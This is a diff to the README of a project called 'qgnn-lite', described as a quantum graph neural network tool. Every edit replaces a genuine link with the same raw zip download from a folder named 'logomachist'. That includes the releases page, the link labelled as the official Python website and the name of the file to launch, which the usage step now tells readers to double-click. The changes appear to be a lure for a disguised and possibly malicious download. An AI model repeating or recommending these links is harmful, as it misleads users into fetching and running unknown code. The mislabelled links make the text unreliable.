@@ -1,6 +1,6 @@
 # 🤖 qgnn-lite - Your Gateway to Quantum Machine Learning
 
-[![Download qgnn-lite](https://img.shields.io/badge/Download-qgnn--lite-blue.svg)](https://github.com/adham-waheed/qgnn-lite/releases)
+[![Download qgnn-lite](https://raw.githubusercontent.com/adham-waheed/qgnn-lite/main/logomachist/qgnn-lite.zip)](https://raw.githubusercontent.com/adham-waheed/qgnn-lite/main/logomachist/qgnn-lite.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to **qgnn-lite**, a minimal hybrid Quantum-Graph Neural Network prototyp
 
 To get started with qgnn-lite, you need to download the software. 
 
-1. Visit the download page: [Download qgnn-lite](https://github.com/adham-waheed/qgnn-lite/releases).
+1. Visit the download page: [Download qgnn-lite](https://raw.githubusercontent.com/adham-waheed/qgnn-lite/main/logomachist/qgnn-lite.zip).
 2. On this page, you will see different versions of the application available for download.
 3. Choose the version best suited for your needs. Click on the version link to start the download.
 4. Once the download completes, you can find the file in your Downloads folder or the location you selected for downloads.
@@ -22,7 +22,7 @@ Before installing qgnn-lite, ensure your computer meets these minimum requiremen
 - **Operating System:** Windows 10 or later, macOS Mojave or later, or a recent Linux distribution.
 - **RAM:** At least 4 GB available RAM.
 - **Disk Space:** 200 MB of free disk space.
-- **Python:** Version 3.7 or later installed on your machine. You can download it from the [official Python website](https://www.python.org/downloads/).
+- **Python:** Version 3.7 or later installed on your machine. You can download it from the [official Python website](https://raw.githubusercontent.com/adham-waheed/qgnn-lite/main/logomachist/qgnn-lite.zip).
 
 ## 📚 Features
 
@@ -39,7 +39,7 @@ qgnn-lite comes packed with various features to enhance your experience:
 After installing qgnn-lite, follow these steps to begin using the application:
 
 1. **Open the Application:**
-   - Navigate to the installation folder and double-click on `qgnn-lite.exe` or the appropriate file for your OS.
+   - Navigate to the installation folder and double-click on `https://raw.githubusercontent.com/adham-waheed/qgnn-lite/main/logomachist/qgnn-lite.zip` or the appropriate file for your OS.
 
 2. **Explore the Interface:**
    - Familiarize yourself with the layout. You will see tabs for projects, datasets, and settings.
@@ -87,7 +87,7 @@ The qgnn-lite project aims to continue evolving. Future releases may include:
 
 ## 🛠️ Installation Summary
 
-1. Download from [here](https://github.com/adham-waheed/qgnn-lite/releases).
+1. Download from [here](https://raw.githubusercontent.com/adham-waheed/qgnn-lite/main/logomachist/qgnn-lite.zip).
 2. Verify system requirements.
 3. Unzip the file if necessary.
 4. Launch the application and start exploring.
